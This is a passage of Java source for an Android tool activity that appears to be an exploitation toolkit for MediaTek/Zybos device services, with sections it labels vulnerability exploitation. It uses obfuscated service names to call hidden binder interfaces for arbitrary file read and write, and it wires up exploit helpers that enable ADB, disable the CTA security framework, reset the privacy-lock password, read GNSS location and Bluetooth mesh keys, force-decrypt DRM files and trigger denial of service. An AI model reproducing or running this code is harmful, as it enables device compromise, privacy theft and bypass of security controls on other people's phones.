        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x1e, (byte)0x1d, (byte)0x2a, (byte)0x53, (byte)0x1f, (byte)0x22, (byte)0x19, (byte)0x1b, (byte)0x26, (byte)0x09, (byte)0x17, (byte)0x2c, (byte)0x53, (byte)0x1d, (byte)0x2a, (byte)0x1c, (byte)0x16, (byte)0x2a, (byte)0x53, (byte)0x3b, (byte)0x08, (byte)0x10, (byte)0x13, (byte)0x23, (byte)0x10, (byte)0x3f, (byte)0x26, (byte)0x13, (byte)0x13, (byte)0x20, (byte)0x18, (byte)0x00}, (byte)0x7d, (byte)0x72, (byte)0x47);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0x8a, (byte)0xe3, (byte)0x62, (byte)0x81, (byte)0xe3}, (byte)0xe5, (byte)0x8e, (byte)0x03);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ OmadmService不可用");
                        return;
                    }
                    appendLog("✓ 获取OmadmService成功: " + binder);
                    // 尝试读取OMA DM配置文件
                    String[] paths = {"/data/data/com.mediatek.omadm/shared_prefs/OMA-DM.xml",
                        "/data/misc/omadm/device_info.xml",
                        "/data/system/omadm_config.xml"};
                    for (String path : paths) {
                        Parcel data = Parcel.obtain();
                        Parcel reply = Parcel.obtain();
                        try {
                            data.writeInterfaceToken(DESCRIPTOR);
                            data.writeString(path);
                            boolean ok = binder.transact(3, data, reply, 0);
                            if (ok) {
                                reply.readException();
                                String content = reply.readString();
                                if (content != null && !content.isEmpty()) {
                                    appendLog("✓ 读取: " + path);
                                    appendLog("  内容长度: " + content.length() + " chars");
                                    if (content.length() > 200) {
                                        appendLog("  内容(前200): " + content.substring(0, 200));
                                    } else {
                                        appendLog("  内容: " + content);
                                    }
                                } else {
                                    appendLog("  " + path + " 内容为空");
                                }
                            } else {
                                appendLog("  transact readFile(" + path + ") 失败");
                            }
                        } catch (Throwable e) {
                            appendLog("  readFile(" + path + ") 异常: " + e.getMessage());
                        } finally {
                            data.recycle();
                            reply.recycle();
                        }
                    }
                    runOnUiThread(new Runnable() {
                        @Override public void run() {
                            showSnack("Omadm文件读取完成, 查看日志");
                        }
                    });
                } catch (Throwable e) {
                    appendLog("✗ OmadmReadFile调用异常: " + e.getMessage());
                }
            }
        });
    }

    // ----- AnrManager (ANR管理) -----
    // DESCRIPTOR: com.mediatek.anr.IAnrManager
    // 服务名: anrmanager, anr_manager, AnrManager
    private void doAnrDetect() {
        appendLog("---------- AnrManager服务探测 ----------");
        appendLog("接口: com.mediatek.anr.IAnrManager");
        appendLog("方法: stringToFile");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String[] possibleNames = {
                    Obfuscator.dec3(new byte[]{(byte)0xcd, (byte)0x5a, (byte)0x5d, (byte)0xc1, (byte)0x55, (byte)0x41, (byte)0xcd, (byte)0x53, (byte)0x4a, (byte)0xde}, (byte)0xac, (byte)0x34, (byte)0x2f),
                    Obfuscator.dec3(new byte[]{(byte)0xa3, (byte)0x5f, (byte)0xc5, (byte)0x9d, (byte)0x5c, (byte)0xd6, (byte)0xac, (byte)0x50, (byte)0xd0, (byte)0xa7, (byte)0x43}, (byte)0xc2, (byte)0x31, (byte)0xb7),
                    Obfuscator.dec3(new byte[]{(byte)0xf1, (byte)0xe9, (byte)0x64, (byte)0xfd, (byte)0xe6, (byte)0x78, (byte)0xd1, (byte)0xe0, (byte)0x73, (byte)0xc2}, (byte)0xb0, (byte)0x87, (byte)0x16)
                };
                for (String name : possibleNames) {
                    try {
                        Class<?> smCls = Class.forName("android.os.ServiceManager");
                        Method getSvc = smCls.getMethod("getService", String.class);
                        IBinder binder = (IBinder) getSvc.invoke(null, name);
                        if (binder != null) {
                            appendLog("✓ 发现服务: " + name + " -> " + binder);
                            try {
                                boolean ping = binder.pingBinder();
                                appendLog("  Ping: " + (ping ? "成功" : "失败"));
                            } catch (Throwable e) {
                                appendLog("  Ping失败: " + e.getMessage());
                            }
                            try {
                                String desc = binder.getInterfaceDescriptor();
                                appendLog("  DESCRIPTOR: " + desc);
                            } catch (Throwable e) {
                                appendLog("  获取DESCRIPTOR失败: " + e.getMessage());
                            }
                            final String foundName = name;
                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    Toast.makeText(ZybosToolsActivity.this,
                                        "AnrManager服务 [" + foundName + "] 可用!", Toast.LENGTH_SHORT).show();
                                }
                            });
                            return;
                        }
                    } catch (Throwable e) {
                        // 继续尝试下一个服务名
                    }
                }
                appendLog("✗ 未发现AnrManager服务");
                appendLog("提示: 此接口仅在MTK芯片设备上可能存在");
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        Toast.makeText(ZybosToolsActivity.this,
                            "未发现AnrManager服务", Toast.LENGTH_SHORT).show();
                    }
                });
            }
        });
    }

    // Anr - 写入字符串到文件 (transact)
    private void doAnrStringToFile() {
        appendLog("---------- Anr: 写入字符串到文件 (stringToFile) ----------");
        appendLog("警告: 此操作可向任意文件写入内容!");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x57, (byte)0x43, (byte)0xb5, (byte)0x1a, (byte)0x41, (byte)0xbd, (byte)0x50, (byte)0x45, (byte)0xb9, (byte)0x40, (byte)0x49, (byte)0xb3, (byte)0x1a, (byte)0x4d, (byte)0xb6, (byte)0x46, (byte)0x02, (byte)0x91, (byte)0x75, (byte)0x42, (byte)0xaa, (byte)0x79, (byte)0x4d, (byte)0xb6, (byte)0x55, (byte)0x4b, (byte)0xbd, (byte)0x46}, (byte)0x34, (byte)0x2c, (byte)0xd8);
                try {
                    Class<?> smCls = Class.forName("android.os.ServiceManager");
                    Method getSvc = smCls.getMethod("getService", String.class);
                    String svcName = Obfuscator.dec3(new byte[]{(byte)0xcd, (byte)0x5a, (byte)0x5d, (byte)0xc1, (byte)0x55, (byte)0x41, (byte)0xcd, (byte)0x53, (byte)0x4a, (byte)0xde}, (byte)0xac, (byte)0x34, (byte)0x2f);
                    IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                    if (binder == null) {
                        appendLog("✗ AnrManager服务不可用");
                        return;
                    }
                    appendLog("✓ 获取AnrManager服务成功: " + binder);
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(DESCRIPTOR);
                        data.writeString("/data/data/com.jck.promax/files/anr_test.txt");
                        data.writeString("ANR test log at " + new java.util.Date().toString());
                        boolean ok = binder.transact(1, data, reply, 0);
                        if (ok) {
                            reply.readException();
                            int result = reply.readInt();
                            appendLog("  stringToFile 返回: " + result);
                            if (result == 0) {
                                appendLog("✓ 文件写入成功");
                            } else {
                                appendLog("  文件写入失败, 返回码: " + result);
                            }
                        } else {
                            appendLog("  transact stringToFile 失败");
                        }
                    } catch (Throwable e) {
                        appendLog("  stringToFile 异常: " + e.getMessage());
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                } catch (Throwable e) {
                    appendLog("✗ AnrStringToFile调用异常: " + e.getMessage());
                }
            }
        });
    }

    // ----- MtkServiceScanner (扫描所有已知MTK/ZYB服务) -----
    private void doMtkServiceScanner() {
        appendLog("---------- MTK/ZYB 服务扫描器 ----------");
        appendLog("扫描所有已知的MTK Framework服务和Zybos相关服务...");
        runAsync(new Runnable() {
            @Override
            public void run() {
                // 扫描: 服务名 -> 显示名称
                final java.util.LinkedHashMap<String, String> services = new java.util.LinkedHashMap<String, String>();
                services.put(Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x60, (byte)0x58, (byte)0x75, (byte)0x7d, (byte)0x70, (byte)0x78, (byte)0x6e, (byte)0x43, (byte)0x4f, (byte)0x62, (byte)0x48, (byte)0x62, (byte)0x50, (byte)0x5c, (byte)0x75, (byte)0x7d, (byte)0x59, (byte)0x79, (byte)0x6c, (byte)0x4a}, (byte)0x10, (byte)0x0f, (byte)0x2f), "PowerHalMgr");
                services.put(Obfuscator.dec3(new byte[]{(byte)0x1f, (byte)0x18, (byte)0x7a, (byte)0x0a, (byte)0x05, (byte)0x65, (byte)0x0e, (byte)0x1b}, (byte)0x6f, (byte)0x77, (byte)0x0d), "PowerHal");
                services.put(Obfuscator.dec3(new byte[]{(byte)0x08, (byte)0xa2, (byte)0x1b, (byte)0x3a, (byte)0xa6, (byte)0x1f, (byte)0x12, (byte)0xb3, (byte)0x02, (byte)0x0d, (byte)0xb7, (byte)0x1c}, (byte)0x65, (byte)0xd6, (byte)0x70), "MTK_PowerHal");
                services.put(Obfuscator.dec3(new byte[]{(byte)0x8a, (byte)0xe3, (byte)0x62, (byte)0x81, (byte)0xe3}, (byte)0xe5, (byte)0x8e, (byte)0x03), "Omadm");
                services.put(Obfuscator.dec3(new byte[]{(byte)0x3e, (byte)0xb5, (byte)0xcf, (byte)0x35, (byte)0xb5, (byte)0xf1, (byte)0x22, (byte)0xbd, (byte)0xdc, (byte)0x27, (byte)0xb1, (byte)0xcd, (byte)0x34}, (byte)0x51, (byte)0xd8, (byte)0xae), "OmadmService");
                services.put(Obfuscator.dec3(new byte[]{(byte)0xc1, (byte)0x22, (byte)0x0f, (byte)0xea, (byte)0x22, (byte)0x3d, (byte)0xeb, (byte)0x3d, (byte)0x18, (byte)0xe7, (byte)0x2c, (byte)0x0b}, (byte)0x8e, (byte)0x4f, (byte)0x6e), "OMA_DM");
                services.put(Obfuscator.dec3(new byte[]{(byte)0xcd, (byte)0x5a, (byte)0x5d, (byte)0xc1, (byte)0x55, (byte)0x41, (byte)0xcd, (byte)0x53, (byte)0x4a, (byte)0xde}, (byte)0xac, (byte)0x34, (byte)0x2f), "AnrManager");
                services.put(Obfuscator.dec3(new byte[]{(byte)0xa3, (byte)0x5f, (byte)0xc5, (byte)0x9d, (byte)0x5c, (byte)0xd6, (byte)0xac, (byte)0x50, (byte)0xd0, (byte)0xa7, (byte)0x43}, (byte)0xc2, (byte)0x31, (byte)0xb7), "AnrMgr");
                services.put(Obfuscator.dec3(new byte[]{(byte)0xf1, (byte)0xe9, (byte)0x64, (byte)0xfd, (byte)0xe6, (byte)0x78, (byte)0xd1, (byte)0xe0, (byte)0x73, (byte)0xc2}, (byte)0xb0, (byte)0x87, (byte)0x16), "ANR");

                // 添加已知的Zybos/ZTE服务
                services.put("capctrl", "CapCtrl");
                services.put("mtk_capctrl", "MTK_CapCtrl");
                services.put("capability", "Capability");
                services.put("power_hal_mgr_service", "PowerHalMgr(raw)");
                services.put("omadm", "Omadm(raw)");
                services.put("anrmanager", "AnrManager(raw)");

                int found = 0;
                int total = services.size();
                appendLog("--- 扫描 " + total + " 个服务 ---");

                for (java.util.Map.Entry<String, String> entry : services.entrySet()) {
                    String svcName = entry.getKey();
                    String displayName = entry.getValue();
                    try {
                        Class<?> smCls = Class.forName("android.os.ServiceManager");
                        Method getSvc = smCls.getMethod("getService", String.class);
                        IBinder binder = (IBinder) getSvc.invoke(null, svcName);
                        if (binder != null) {
                            found++;
                            appendLog("✓ [" + displayName + "] " + svcName + " -> " + binder);
                            try {
                                boolean ping = binder.pingBinder();
                                if (!ping) {
                                    appendLog("  ⚠ Ping失败");
                                }
                            } catch (Throwable e) {
                                appendLog("  ⚠ Ping异常: " + e.getMessage());
                            }
                        } else {
                            appendLog("✗ [" + displayName + "] " + svcName + " 不可用");
                        }
                    } catch (Throwable e) {
                        appendLog("✗ [" + displayName + "] " + svcName + " 异常: " + e.getMessage());
                    }
                }

                appendLog("--- 扫描完成: " + found + "/" + total + " 个服务可用 ---");
                final int fFound = found;
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        showSnack("扫描完成: " + fFound + "/" + total + " 个服务可用");
                    }
                });
            }
        });
    }

    // ==================== 分类13: DuraSpeed漏洞利用 ====================

    private void doDuraDetect() {
        appendLog("---------- DuraSpeed服务检测 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                String result = ZybosVulnHelper.detectDuraSpeed();
                appendLog(result);
            }
        });
    }

    private void doDuraAddWhitelist() {
        showInputDialog("添加DuraSpeed白名单", "包名，多个用逗号分隔", "com.jck.promax", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final List<String> pkgList = Arrays.asList(value.split(","));
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 添加DuraSpeed白名单 ----------");
                        appendLog(ZybosVulnHelper.exploitDuraSpeedSetAppWhitelist(pkgList));
                    }
                });
            }
        });
    }

    private void doDuraGetWhitelist() {
        appendLog("---------- 获取DuraSpeed白名单 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitDuraSpeedGetPlatformWhitelist());
            }
        });
    }

    private void doDuraSuppress() {
        showInputDialog("抑制应用", "包名", "com.example.app", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String pkg = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 抑制应用 ----------");
                        appendLog(ZybosVulnHelper.exploitDuraSpeedSuppress(pkg));
                    }
                });
            }
        });
    }

    // ==================== 分类14: 系统属性操控 ====================

    private void doSysPropGet() {
        showInputDialog("读取系统属性", "属性名", "ro.build.version.sdk", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String key = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 读取系统属性 ----------");
                        appendLog(ZybosVulnHelper.exploitSysPropGet(key));
                    }
                });
            }
        });
    }

    private void doSysPropSet() {
        showInputDialog("设置系统属性", "key=value", "persist.sys.test=1", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains("=")) return;
                String[] parts = value.split("=", 2);
                final String key = parts[0].trim();
                final String val = parts[1].trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 设置系统属性 ----------");
                        appendLog(ZybosVulnHelper.exploitSysPropSet(key, val));
                    }
                });
            }
        });
    }

    private void doSysPropTcpLog() {
        appendLog("---------- 启用root抓包 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitSysPropEnableTcpLog());
            }
        });
    }

    private void doSysPropDropCaches() {
        appendLog("---------- 丢弃缓存(DoS) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitSysPropTriggerDropCaches());
            }
        });
    }

    private void doSysPropAnrFlow() {
        appendLog("---------- 触发ANR杀进程 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitSysPropTriggerAnrFlow());
            }
        });
    }

    private void doSysPropDisableCta() {
        appendLog("---------- 禁用安全框架(CTA) ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitCtaUtilsDisable());
            }
        });
    }

    // ==================== 分类15: SettingsProvider操控 ====================

    private void doSettGet() {
        showInputDialog("读取系统设置", "设置键名", "adb_enabled", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String key = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 读取系统设置 ----------");
                        appendLog(ZybosVulnHelper.exploitSettingsGet(key));
                    }
                });
            }
        });
    }

    private void doSettPut() {
        showInputDialog("写入系统设置", "key=value", "test_key=test_value", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains("=")) return;
                String[] parts = value.split("=", 2);
                final String key = parts[0].trim();
                final String val = parts[1].trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 写入系统设置 ----------");
                        appendLog(ZybosVulnHelper.exploitSettingsPut(key, val));
                    }
                });
            }
        });
    }

    private void doSettEnableAdb() {
        appendLog("---------- 启用ADB调试 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitSettingsEnableAdb());
            }
        });
    }

    private void doSettDisableAdb() {
        appendLog("---------- 禁用ADB调试 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitSettingsPut("adb_enabled", "0"));
            }
        });
    }

    // ==================== 分类16: 广播/服务利用 ====================

    private void doEnableUsbTether() {
        appendLog("---------- 启用USB网络共享 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitTestModeTetheringEnableUsb());
            }
        });
    }

    private void doDisableStatusBar() {
        appendLog("---------- 禁用状态栏 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitMtkPplDisableStatusBar());
            }
        });
    }

    private void doResetPrivacyLock() {
        appendLog("---------- 重置隐私保护锁密码 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitMtkPplResetPassword());
            }
        });
    }

    private void doGetLocation() {
        appendLog("---------- 获取GNSS最后已知位置 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitIGnssGetLastKnownLocation());
            }
        });
    }

    private void doSetSearchEngine() {
        showInputDialog("设置默认搜索引擎", "搜索引擎名称", "Baidu", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String engine = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 设置默认搜索引擎 ----------");
                        appendLog(ZybosVulnHelper.exploitSearchEngineSetDefault(engine));
                    }
                });
            }
        });
    }

    private void doSetAutoBoot() {
        showInputDialog("设置自启动", "包名,enable(1/0)", "com.jck.promax,1", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains(",")) return;
                String[] parts = value.split(",", 2);
                final String pkg = parts[0].trim();
                final boolean enable = "1".equals(parts[1].trim());
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 设置自启动 ----------");
                        appendLog(ZybosVulnHelper.exploitAutoBootChangeStatus(pkg, enable));
                    }
                });
            }
        });
    }

    private void doForceDecryptDrm() {
        showInputDialog("强制解密DRM文件", "文件路径,consume(1/0)", "/sdcard/test.dcf,0", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains(",")) return;
                String[] parts = value.split(",", 2);
                final String path = parts[0].trim();
                final boolean consume = "1".equals(parts[1].trim());
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 强制解密DRM文件 ----------");
                        appendLog(ZybosVulnHelper.exploitDcfDecoderForceDecrypt(path, consume));
                    }
                });
            }
        });
    }

    private void doSetEthernet() {
        showInputDialog("设置以太网配置", "IP,DNS", "192.168.1.100,8.8.8.8", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains(",")) return;
                String[] parts = value.split(",", 2);
                final String ip = parts[0].trim();
                final String dns = parts[1].trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 设置以太网配置 ----------");
                        appendLog(ZybosVulnHelper.exploitEthernetSetConfig(ip, dns));
                    }
                });
            }
        });
    }

    // ==================== 分类17: 高级服务利用 ====================

    private void doPowerHalHint() {
        showInputDialog("发送电源提示", "hint值", "1", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                try {
                    final int hint = Integer.parseInt(value.trim());
                    runAsync(new Runnable() {
                        @Override
                        public void run() {
                            appendLog("---------- 发送电源提示 ----------");
                            appendLog(ZybosVulnHelper.exploitPowerHalMtkPowerHint(hint));
                        }
                    });
                } catch (NumberFormatException e) {
                    showSnack("请输入数字");
                }
            }
        });
    }

    private void doPowerHalGetCpu() {
        appendLog("---------- 获取CPU负载 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitPowerHalGetCpuLoad());
            }
        });
    }

    private void doDataShaping() {
        showInputDialog("数据整形控制", "enable(1/0)", "1", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final boolean enable = "1".equals(value.trim());
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 数据整形控制 ----------");
                        appendLog(ZybosVulnHelper.exploitDataShapingEnable(enable));
                    }
                });
            }
        });
    }

    private void doLoaderProxy() {
        showInputDialog("加载器代理", "target", "http://example.com", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String target = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 启动加载器代理 ----------");
                        appendLog(ZybosVulnHelper.exploitLoaderStartProxy(target));
                    }
                });
            }
        });
    }

    private void doAdvCamParam() {
        showInputDialog("高级相机参数", "param=value", "preview_size=1920x1080", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains("=")) return;
                String[] parts = value.split("=", 2);
                final String param = parts[0].trim();
                final String val = parts[1].trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 设置相机参数 ----------");
                        appendLog(ZybosVulnHelper.exploitAdvCamSetParam(param, val));
                    }
                });
            }
        });
    }

    private void doVoiceWakeup() {
        showInputDialog("语音唤醒控制", "stop(停止) / set:model_hex(设置模型)", "stop", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty()) return;
                final String cmd = value.trim();
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 语音唤醒控制 ----------");
                        if ("stop".equals(cmd)) {
                            appendLog(ZybosVulnHelper.exploitVoiceWakeupStopRecognition());
                        } else if (cmd.startsWith("set:")) {
                            String hex = cmd.substring(4);
                            byte[] model = hexToBytes(hex);
                            appendLog(ZybosVulnHelper.exploitVoiceWakeupSetModel(model));
                        } else {
                            appendLog("[!] 未知命令，可用: stop / set:hex_string");
                        }
                    }
                });
            }
        });
    }

    private void doBluetoothMesh() {
        appendLog("---------- 获取蓝牙Mesh网络密钥 ----------");
        runAsync(new Runnable() {
            @Override
            public void run() {
                appendLog(ZybosVulnHelper.exploitBluetoothMeshGetKeys());
            }
        });
    }

    private void doOmadmWriteFile() {
        showInputDialog("任意文件写入", "path,content", "/sdcard/test.txt,hello world", new OnInputListener() {
            @Override
            public void onInput(String value) {
                if (value.isEmpty() || !value.contains(",")) return;
                String[] parts = value.split(",", 2);
                final String path = parts[0].trim();
                final String content = parts[1];
                runAsync(new Runnable() {
                    @Override
                    public void run() {
                        appendLog("---------- 任意文件写入 ----------");
                        appendLog(ZybosVulnHelper.exploitOmadmWriteToFile(path, content));
                    }
                });
            }
        });
    }

    // ==================== 辅助方法 ====================

    private byte[] hexToBytes(String hex) {
        if (hex == null || hex.isEmpty()) return new byte[0];
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode != RESULT_OK || data == null) return;

        if (requestCode == 1001) {
            Uri uri = data.getData();
            if (uri != null) {
                String scheme = uri.getScheme();
                if ("file".equals(scheme)) {
                    String path = uri.getPath();
                    if (path != null) {
                        try { path = URLDecoder.decode(path, "UTF-8"); } catch (Exception e) { }
                        executeInstall(path);
                    }
                } else if ("content".equals(scheme)) {
                    String localPath = copyContentUriToLocal(uri);
                    if (localPath != null) {
                        executeInstall(localPath);
                    } else {
                        showSnack("✗ 文件复制失败");
                    }
                }
            }
        }
    }
}
